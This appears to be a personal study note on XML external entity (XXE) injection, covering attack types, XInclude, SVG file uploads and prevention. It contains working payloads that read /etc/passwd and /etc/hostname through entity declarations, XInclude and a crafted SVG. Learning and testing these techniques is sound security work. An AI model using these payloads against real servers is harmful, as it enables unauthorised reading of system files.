---
publish: true
created: 2026-06-26T15:28:35.561+05:30
modified: 2026-08-05T16:35:41.493+05:30
---

# Introduction

## XXE

XXE - XML external entity injection.

1. It is a web application vulnerability that allows an attacker to interfere with the way a web application processes XML.
2. This allows the attacker to view the local files on the application server file system and interact with back-end, other systems that the application itself can access (via SSRF attacks).

DTD - Document Type Definition.

1. A DTD defines the structure and the legal elements and attributes of an XML document.
2. External entity is used, when entity is not defined in the DTD.

Types of Attacks

1. XXE - Read local file system
2. XXE - SSRF attacks
3. Blind XXE and exfil via out of band
4. Blind XXE and exfil via errors.

Example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

## Blind XXE

use out of band techniques to exfiltrate.

# Methods

## XInclude attacks

sometimes, you cannot define new entity or use DOCTYPE. in that case, use XInclude.

example:

```xml
<foo
    xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

if you find `productId=1`, modify to `productId=<ALL_XML_ABOVE>`.

## File upload

XML-Based formats : DOCX, SVG.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ 
<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px"
    xmlns="http://www.w3.org/2000/svg"
    xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## Modified Content-Type

from `application/x-www-form-urlencoded` to `text/xml`.

# Other attacks

use XML to exploit XSS, SQLi.

# Prevention

Some ways to prevent:

1. Disable unknown and un-used features which are enabled by default in XML parser.
2. Disable usage of `XInclude` usage in xml.
3. check configs of xml parser or API to disable above.

<https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#minimal-xml-hardening-rules>
